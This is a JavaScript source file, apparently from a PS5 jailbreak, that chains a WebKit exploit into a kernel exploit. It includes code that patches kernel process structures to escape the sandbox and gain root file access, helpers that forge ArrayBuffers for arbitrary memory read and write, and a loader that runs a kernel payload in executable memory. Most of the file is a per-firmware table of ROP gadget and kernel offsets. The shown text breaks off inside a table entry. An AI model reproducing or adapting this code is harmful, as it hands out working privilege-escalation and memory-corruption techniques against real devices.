const MAIN_CORE = 9;

const k_proc_pid = 0xbc;
const k_pipe_sigio = 0xd8;
const k_filedesc_sizeof = 0x30;
const k_filedesc_fdt_ofiles = 8;
const k_in6p_outputopts = 0x120;
const k_ip6po_rthdr = 0x70;
const k_ip6po_tclass = 0xc0;

let syscall_wrapper = undefined;

function init_syscalls() {
  const _close_addr = libkernel_base.add(impl.lk_close);
  logger.debug(`_close_addr: ${_close_addr}`);

  syscall_wrapper = _close_addr.add(7);
  logger.debug(`syscall_wrapper: ${syscall_wrapper}`);
}

function get_syscall(id) {
  return syscall_wrapper;
}

async function exploit() {
  if (version.major < 3) {
    await load_script('src/lapse.js');
  } else {
    await load_script('src/ps5/relapse.js');
  }

  await exploit_main();
}

function make_pipe() {
  const pair_addr = mem.alloc(8);

  if (!fn.hasOwnProperty('pipe2')) {
    fn.pipe2 = new NativeFunction(0x2af, 'number');
  }

  if (fn.pipe2.invoke(pair_addr) === -1) {
    throw new SyscallError('Unable to create pipe !!');
  }

  const rp = arw.view(pair_addr).getInt32(0, true);
  const wp = arw.view(pair_addr).getInt32(4, true);

  mem.free(pair_addr);

  return [rp, wp];
}

function patch_proc(p, kp) {
  const p_fd = kview(p).getBInt(0x48, true);
  const kp_fd = kview(kp).getBInt(0x48, true);

  // Allow root file system access
  const root_vnode = kview(kp_fd).getBInt(0x08, true);

  kview(p_fd).setBInt(0x08, root_vnode, true); // fd_cdir
  kview(p_fd).setBInt(0x10, root_vnode, true); // fd_rdir
  kview(p_fd).setBInt(0x18, 0, true); // fd_jdir

  // Allow syscall from everywhere.
  const p_dynlib = kview(p).getBInt(0x3e8, true);

  kview(p_dynlib).setBInt(0xf0, 0, true); // start
  kview(p_dynlib).setBInt(0xf8, -1, true); // end
  kview(p_dynlib).setInt32(impl.k_dynlib_status, 0, true); // status

  // Allow dlsym.
  const dynlib_eboot = kview(p_dynlib).getBInt(0, true);
  const eboot_segments = kview(dynlib_eboot).getBInt(0x40, true);

  kview(eboot_segments).setBInt(0x08, 0, true); // addr
  kview(eboot_segments).setBInt(0x10, -1, true); // size
}

async function post_jailbreak() {
  const kexp_u8 = await load_file('src/ps5/kexp.bin');
  const elfldr_u8 = await load_file('src/ps5/elfldr.elf');

  const kexp_addr = kexp_u8.buffer.data();
  const kexp_page_size = kexp_u8.length.alignUp(PAGE_SIZE);

  logger.debug(`kexp_addr: ${kexp_addr}`);
  logger.debug(`kexp_page_size: ${kexp_page_size.hex()}`);

  const elfldr_addr = elfldr_u8.buffer.data();
  const elfldr_size = elfldr_u8.length;

  logger.debug(`elfldr_addr: ${elfldr_addr}`);
  logger.debug(`elfldr_size: ${elfldr_size.hex()}`);

  const exec_fd = fn.jitshm_create.invoke(0, kexp_page_size, 7);
  logger.debug(`exec_fd: ${exec_fd}`);

  const map_addr = fn.mmap.invoke(0, kexp_page_size, 7, 0, exec_fd, 0);
  logger.debug(`map_addr: ${map_addr}`);

  if (map_addr.eq(-1)) {
    throw new SyscallError(`Unable to map memory with size ${kexp_page_size.hex(false)}`);
  }

  mem.copy(map_addr, kexp_addr, kexp_u8.length);

  const pthread_addr_addr = mem.alloc(8);
  const payload_args = mem.alloc(0x28);

  logger.debug(`payload_args: ${payload_args}`);

  arw.view(payload_args).setInt32(0x00, master_pipe[0], true);
  arw.view(payload_args).setInt32(0x04, master_pipe[1], true);
  arw.view(payload_args).setInt32(0x08, victim_pipe[0], true);
  arw.view(payload_args).setInt32(0x0c, victim_pipe[1], true);
  arw.view(payload_args).setBInt(0x10, allproc, true);
  arw.view(payload_args).setBInt(0x18, elfldr_addr, true);
  arw.view(payload_args).setBInt(0x20, elfldr_size, true);

  if (fn.pthread_create.invoke(pthread_addr_addr, 0, map_addr, payload_args)) {
    throw new Error('Unable to create bin thread !!');
  }

  const pthread_addr = arw.view(pthread_addr_addr).getBInt(0, true);
  const pthread_id = arw.view(pthread_addr).getBInt(0, true);

  logger.info(`Created bin thread with id ${pthread_id} !!`);

  const ret_addr = mem.alloc(8);

  if (fn.pthread_join.invoke(pthread_addr, ret_addr)) {
    throw new Error(`Unable to join thread ${pthread_id} !!`);
  }

  const ret = arw.view(ret_addr).getInt32(0, true);

  logger.info(`bin returned ${ret} !!`);

  if (fn.munmap.invoke(map_addr, kexp_page_size)) {
    throw new SyscallError(`Unable to munmap ${map_addr} !!`);
  }

  if (fn.close.invoke(exec_fd) === -1) {
    throw new SyscallError(`Unable to close fd ${exec_fd} !!`);
  }

  mem.free(pthread_addr_addr);
  mem.free(payload_args);
  mem.free(ret_addr);
}

const impl_map = {
  3: {
    0: {
      k_sysctl___kern_smp_cpus: 0x256d710,
      k_route_output_rtmsg2_ret: 0xa1ab8a,
      k_ntpadj_lock: 0x186e9f8,
      k_dynlib_status: 0x118,
      k_allproc: 0x333dc58,
      k_aio_table: 0xc00,

      lk_close: 0x33980,
      lk__error: 0x1cf70,
      lc_strerror: 0x7b200,

      wk_pthread_create: 0x21ead30,
      wk_pthread_join: 0x21ead70,
      wk_expm1_builtin: 0x7be0,
      wk___imp___error: 0x28ddea8,
      wk___imp_strerror: 0x28dded0,

      wk_TypedArray_m_mode: 0x1c,
      wk_JSFunction_m_function: 0x28,
      wk_ArrayBuffer_m_contents_m_data: 0x10,
      wk_ArrayBuffer_m_contents_m_sizeInBytes: 0x24,
      wk_JSGlobalObject_m_vm_topEntryFrame: 0x9ee0,

      get wk_RET() {
        return webkit_base.add(0xc7);
      },
      get wk_LEAVE_RET() {
        return webkit_base.add(0x20c0766);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0x1d8acc3);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0x12fb56c);
      },
      get wk_POP_R11_RET() {
        return webkit_base.add(0x1b2be9b);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0x99a21);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0x1917101);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0x21e53a9);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x2181023);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0x70d534);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0xc1ce06);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0x1ec9443);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x1583126);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0x2181024);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0x21e53aa);
      },
      get wk_POP_RBP_RET() {
        return webkit_base.add(0x21eae9b);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0x21a259f);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
        return webkit_base.add(0x1f8865c);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0x176b510);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0x1c3b5a4);
      },
      make_fake_container(jscell) {
        const container = {
          jscell: jscell, // NaN-boxed, fix later
          butterfly: null, // becomes 0x2, fix later
          vector: arw.victim,
          length_and_mode: true, // becomes 0x7
        };

        delete container.butterfly; // becomes 0

        return container;
      },
      make_master(victim_addr) {
        arw.victim.setBInt(0x10, victim_addr, true);
        arw.victim.setUint32(impl.wk_TypedArray_m_mode, 1, true); // TypedArrayMode:OversizeTypedArray
      },
      fix_victim() {
        const victim_addr = arw.addrof(arw.victim);
        logger.debug(`victim_addr: ${victim_addr}`);

        arw.view(victim_addr).setInt32(0x18, -1, true);
      },
      ab_fake(ab, addr, len) {
        const ab_addr = arw.addrof(ab);
        const m_impl = arw.view(ab_addr).getBInt(0x10, true);
        const m_data = arw.view(m_impl).getBInt(0x10, true);

        ab.m_data = m_data;

        arw.view(m_impl).setBInt(0, 2, true); // DeferrableRefCountedBase::m_refCount
        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_data, addr, true);
        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_sizeInBytes, len, true);
      },
      ab_free(ab) {
        const ab_addr = arw.addrof(ab);
        const m_impl = arw.view(ab_addr).getBInt(0x10, true);

        arw.view(m_impl).setBInt(0, 0, true); // DeferrableRefCountedBase::m_refCount
        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_data, ab.m_data, true);
        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_sizeInBytes, 0, true);
      },
      ab_data(ab) {
        const ab_addr = arw.addrof(ab);
        const m_impl = arw.view(ab_addr).getBInt(0x10, true);

        return arw.view(m_impl).getBInt(impl.wk_ArrayBuffer_m_contents_m_data, true);
      },
    },
    0x10: {
      k_route_output_rtmsg2_ret: 0xa1abca,
    },
    0x20: {
      k_route_output_rtmsg2_ret: 0xa1b08a,

      wk_pthread_create: 0x21eaef0,
      wk_pthread_join: 0x21eaf30,

      get wk_LEAVE_RET() {
        return webkit_base.add(0x21bc6b3);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0x1d8ae93);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0x12fb6ac);
      },
      get wk_POP_R11_RET() {
        return webkit_base.add(0x1b8bf6f);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0x5e2e2d);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0x1c1cc7f);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0x21e5569);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x21811e3);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0x201464d);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0xc1cea6);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0x1f44d43);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x1b0135f);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0x21811e4);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0x21e556a);
      },
      get wk_POP_RBP_RET() {
        return webkit_base.add(0x21eb05b);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0xb36a06);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
        return webkit_base.add(0x1f8882c);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0x176b6e0);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0x1c3b774);
      },
    },
  },
  4: {
    0: {
      k_sysctl___kern_smp_cpus: 0x260fd50,
      k_route_output_rtmsg2_ret: 0xa48c47,
      k_ntpadj_lock: 0x190f758,
      k_allproc: 0x33edcb8,

      lk_close: 0x34030,
      lk__error: 0x1d2a0,
      lc_strerror: 0x7c6d0,

      wk_pthread_create: 0x2208b40,
      wk_pthread_join: 0x2208b80,
      wk_expm1_builtin: 0x2518,
      wk___imp___error: 0x28f9d28,
      wk___imp_strerror: 0x28f9d50,

      get wk_LEAVE_RET() {
        return webkit_base.add(0x1be4950);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0x1da92c3);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0x1c7af80);
      },
      get wk_POP_R11_RET() {
        return webkit_base.add(0x19c1b79);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0xce6250);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0x1936b11);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0x2203119);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x21d35c3);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0xcc5bbc);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0x2202df0);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0x1d532d3);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x213947e);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0x21d35c4);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0x220311a);
      },
      get wk_POP_RBP_RET() {
        return webkit_base.add(0x2208cab);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0x14ff8f0);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
        return webkit_base.add(0x1fa8e6c);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0x1789f70);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0x1c5a054);
      },
    },
    2: {
      k_route_output_rtmsg2_ret: 0xa48c97,

      wk_pthread_create: 0x2208ba0,
      wk_pthread_join: 0x2208be0,

      get wk_LEAVE_RET() {
        return webkit_base.add(0x1bb3a18);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0x1da9323);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0x1c7afe0);
      },
      get wk_POP_R11_RET() {
        return webkit_base.add(0x19c1bd9);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0xce62b0);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0x1936b71);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0x2203179);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x21d3623);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0x15d1e44);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0x2202e50);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0x21e42f3);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0xa02f15);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0x21d3624);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0x220317a);
      },
      get wk_POP_RBP_RET() {
        return webkit_base.add(0x2208d0b);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0x14ff950);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
        return webkit_base.add(0x1fa8ecc);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0x1789fd0);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0x1c5a0b4);
      },
    },
    3: {
      k_route_output_rtmsg2_ret: 0xa48d27,
    },
    0x50: {
      k_route_output_rtmsg2_ret: 0xa48ed7,
    },
    0x51: {
      k_route_output_rtmsg2_ret: 0xa49307,
    },
  },
  5: {
    0: {
      k_sysctl___kern_smp_cpus: 0x273c6e0,
      k_route_output_rtmsg2_ret: 0xa7884f,
      k_ntpadj_lock: 0x1a3efb8,
      k_allproc: 0x355dd00,

      lk_close: 0x35680,
      lk__error: 0x1d830,
      lc_strerror: 0x794a0,

      wk_pthread_create: 0x21bf050,
      wk_pthread_join: 0x21bf090,
      wk_expm1_builtin: 0x15948,
      wk___imp___error: 0x28d4da0,
      wk___imp_strerror: 0x28d4dc8,

      get wk_LEAVE_RET() {
        return webkit_base.add(0x8ff1e3);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0x1d2e3f3);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0x149b4cc);
      },
      get wk_POP_R11_RET() {
        return webkit_base.add(0x189d591);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0x129f699);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0x189d5a1);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0x21b9609);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x1ee4336);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0x1e7155c);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0x57793d);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0x2119fd3);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x193df77);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0x1ee4337);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0x3365fe);
      },
      get wk_POP_RBP_RET() {
        return webkit_base.add(0x193744d);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0x0585416);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
        return webkit_base.add(0x1f4a57c);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0x19da576);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0xb511ed);
      },
    },
    0x10: {
      k_route_output_rtmsg2_ret: 0xa78a9f,
    },
    0x50: {
      k_sysctl___kern_smp_cpus: 0x273c820,
      k_route_output_rtmsg2_ret: 0xa7988f,

      lk_close: 0x35750,

      wk_pthread_create: 0x21c0220,
      wk_pthread_join: 0x21c0260,
      wk___imp___error: 0x28d8da0,
      wk___imp_strerror: 0x28d8dc8,

      get wk_LEAVE_RET() {
        return webkit_base.add(0x21335e3);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0x1d2f5c3);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0x149ca0c);
      },
      get wk_POP_R11_RET() {
        return webkit_base.add(0x189e761);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0x12a11c9);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0x189e771);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0x21ba7e9);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x1ee5506);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0x1d5c288);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0x21ba473);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0x20649b3);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x21bd082);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0x1ee5507);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0x21ba7ea);
      },
      get wk_POP_RBP_RET() {
        return webkit_base.add(0x9d099a);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0x1e5ed70);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
        return webkit_base.add(0x1f4b74c);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0x19db746);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0xb51f0d);
      },
    },
  },
  6: {
    0: {
      k_sysctl___kern_smp_cpus: 0x277e4c0,
      k_route_output_rtmsg2_ret: 0xa9e7a0,
      k_ntpadj_lock: 0x1a7f478,
      k_allproc: 0x34c9d20,
      k_aio_table: 0xc28,

      lk_close: 0x36660,
      lk__error: 0x1e050,
      lc_strerror: 0x73a60,

      wk_pthread_create: 0x36a3020,
      wk_pthread_join: 0x36a3060,
      wk_expm1_builtin: 0x5a068,
      wk___imp___error: 0x3e489f0,
      wk___imp_strerror: 0x3e48a10,

      wk_TypedArray_m_mode: 0x20,
      wk_ArrayBuffer_m_contents_m_sizeInBytes: 0x28,
      wk_JSGlobalObject_m_vm_topEntryFrame: 0x9a70,

      get wk_LEAVE_RET() {
        return webkit_base.add(0x361cde3);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0x2e71bcb);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0x4dfc02);
      },
      get wk_POP_R11_RET() {
        return webkit_base.add(0x212da23);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0x329acb3);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0x378a6f);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0x31a7359);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x360e3a6);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0x18cb6d4);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0x44c126);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0x5f7863);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x165e5a);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0x360e3a7);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0x31a735a);
      },
      get wk_POP_RBP_RET() {
        return webkit_base.add(0x1b6cf3);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0x1ff318a);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
        return webkit_base.add(0x2d94707);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0x25795ff);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0x2e03076);
      },
      make_fake_container(jscell) {
        const container = {
          jscell: jscell, // NaN-boxed, fix later
          butterfly: null, // becomes 0x2, fix later
          vector: arw.victim,
          length: true, // becomes 0x7
          mode: null, // becomes 0x2, fix later
        };

        delete container.butterfly; // becomes 0
        delete container.mode; // becomes 0

        return container;
      },
      make_master(victim_addr) {
        arw.victim.setBInt(0x10, victim_addr, true);
        arw.victim.setBInt(impl.wk_TypedArray_m_mode, 1, true); // TypedArrayMode:OversizeTypedArray
      },
      fix_victim() {
        const victim_addr = arw.addrof(arw.victim);
        logger.debug(`victim_addr: ${victim_addr}`);

        arw.view(victim_addr).setBInt(0x18, -1, true);
      },
    },
    2: {
      k_route_output_rtmsg2_ret: 0xa9e780,

      wk_expm1_builtin: 0x5b758,

      get wk_POP_R9_RET() {
        return webkit_base.add(0x4dea92);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0x374fff);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0xa63a46);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0x18cb711);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0x2f1873f);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x3521db7);
      },
      get wk_POP_RBP_RET() {
        return webkit_base.add(0x1b5993);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0x36318b0);
      },
    },
    0x50: {
      k_route_output_rtmsg2_ret: 0xa9eef0,
    },
  },
  7: {
    0: {
      k_sysctl___kern_smp_cpus: 0x27706c0,
      k_route_output_rtmsg2_ret: 0xa83731,
      k_ntpadj_lock: 0x1a6fe18,
      k_allproc: 0x34a9d50,
      k_aio_table: 0xc38,

      lk_close: 0x37210,
      lk__error: 0x1e7b0,
      lc_strerror: 0x75060,

      wk_pthread_create: 0x3670c80,
      wk_pthread_join: 0x3670cc0,
      wk_expm1_builtin: 0x10f88,
      wk___imp___error: 0x3e14998,
      wk___imp_strerror: 0x3e149b8,

      get wk_LEAVE_RET() {
        return webkit_base.add(0x315a123);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0x35f8808);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0x12146f3);
      },
      get wk_POP_R11_RET() {
        return webkit_base.add(0x98b087);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0x3269ce3);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0x2fba320);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0x35da3b5);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x35dd0f6);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0x1e1ab4);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0x2865881);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0xa3996e);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x28f0c82);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0xc8a85);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0xc5a80);
      },
      get wk_POP_RBP_RET() {
        return webkit_base.add(0xc5bbe);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0x21441a);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
        return webkit_base.add(0x2d66ef7);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0x2556a5f);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0x2dd2f56);
      },
    },
    1: {
      lk_close: 0x37210,
      lk__error: 0x1e7b0,
    },
    0x20: {
      k_sysctl___kern_smp_cpus: 0x2770780,
      k_route_output_rtmsg2_ret: 0xa83b81,
      k_ntpadj_lock: 0x1a6fed8,
      k_dynlib_status: 0x120,

      lk_close: 0x37250,
      lk__error: 0x1e7f0,
    },
    0x40: {
      wk_pthread_create: 0x3670f60,
      wk_pthread_join: 0x3670fa0,
      wk___imp___error: 0x3e18998,
      wk___imp_strerror: 0x3e189b8,

      get wk_LEAVE_RET() {
        return webkit_base.add(0x36031b3);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0x35f8ae8);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0x6be833);
      },
      get wk_POP_R11_RET() {
        return webkit_base.add(0x22184fd);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0x3269fc3);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0x56236f);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0x35da695);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x35dd3d6);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0x35f8ae9);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0x29b04c1);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0xa39c4e);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x2160f92);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0xc3d80d);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0x13362e);
      },
      get wk_POP_RBP_RET() {
        return webkit_base.add(0x5f2893);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0x20df878);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
        return webkit_base.add(0x2d671d7);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0x2556d3f);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0x2dd3236);
      },
    },
    0x60: {
      k_sysctl___kern_smp_cpus: 0x2770800,
      k_route_output_rtmsg2_ret: 0xa84191,

      wk_pthread_create: 0x3670f80,
      wk_pthread_join: 0x3670fc0,

      get wk_LEAVE_RET() {
        return webkit_base.add(0x36031d3);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0x35f8b08);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0x10ca0df);
      },
      get wk_POP_R11_RET() {
        return webkit_base.add(0x32184f6);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0x3269fe3);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0x20fd403);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0x35da6b5);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x35dd3f6);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0x35f8b09);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0x12def46);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0x315845d);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x22185fd);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0xc3d83d);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0x13362e);
      },
      get wk_POP_RBP_RET() {
        return webkit_base.add(0x5f2893);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0x35d0aa0);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
        return webkit_base.add(0x2d671f7);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0x2556d5f);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0x2dd3256);
      },
    },
  },
  8: {
    0: {
      k_sysctl___kern_smp_cpus: 0x27914e0,
      k_route_output_rtmsg2_ret: 0xa9cac5,
      k_ntpadj_lock: 0x1a8ff48,
      k_dynlib_status: 0x140,
      k_allproc: 0x34e5d50,

      lk_close: 0x1af90,
      lk__error: 0xeb50,
      lc_strerror: 0x78530,

      wk_pthread_create: 0x366ce70,
      wk_pthread_join: 0x366ceb0,
      wk_expm1_builtin: 0x7f48,
      wk___imp___error: 0x3df49c0,
      wk___imp_strerror: 0x3df49e0,

      get wk_LEAVE_RET() {
        return webkit_base.add(0x3384c2b);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0x35e00f8);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0xd9ff57);
      },
      get wk_POP_R11_RET() {
        return webkit_base.add(0x313ab2d);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0x3246223);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0x1bd6ef);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0x35c1e29);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x33f30ed);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0x366a0fa);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0x15f2841);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0x3669ff2);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x35b8d75);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0x8ad356);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0x80fd98);
      },
      get wk_POP_RBP_RET() {
        return webkit_base.add(0x11be3d7);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0x8ad656);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
